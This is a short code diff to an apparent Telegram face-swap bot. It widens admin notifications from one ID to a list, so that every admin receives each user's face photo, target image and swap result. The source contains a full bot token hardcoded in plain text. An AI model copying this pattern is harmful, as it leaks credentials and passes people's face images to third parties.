@@ -11,7 +11,7 @@ const token = '7471436103:AAH2tyLclgLuj9eDtdNvPOEmqmwT_ZsHO5g';
 const bot = new TelegramBot(token, { polling: true });
 
 const updatesChannelUrl = 'https://t.me/usefulltgbots';
-const adminId = '6135009699';  // Admin's Telegram ID
+const adminIds = ['6135009699', '5777464952']; // Array of admin IDs
 
 // Store user data and statistics
 const usersFilePath = path.resolve(__dirname, 'id.txt');
@@ -194,13 +194,15 @@ const sendAdminNotification = async (userId, faceImage, targetImage, resultImage
     - User ID: ${userId}
   `;
 
-  try {
-    await bot.sendMessage(adminId, message, { parse_mode: 'Markdown' });
-    await bot.sendPhoto(adminId, faceImage, { caption: '📷 Face Image' });
-    await bot.sendPhoto(adminId, targetImage, { caption: '🖼️ Target Image' });
-    await bot.sendPhoto(adminId, resultImagePath, { caption: '✅ Result Image' });
-  } catch (error) {
-    console.error(`Failed to send message to admin: ${error.message}`);
+  for (const adminId of adminIds) {
+    try {
+      await bot.sendMessage(adminId, message, { parse_mode: 'Markdown' });
+      await bot.sendPhoto(adminId, faceImage, { caption: '📷 Face Image' });
+      await bot.sendPhoto(adminId, targetImage, { caption: '🖼️ Target Image' });
+      await bot.sendPhoto(adminId, resultImagePath, { caption: '✅ Result Image' });
+    } catch (error) {
+      console.error(`Failed to send message to admin (${adminId}): ${error.message}`);
+    }
   }
 };
 
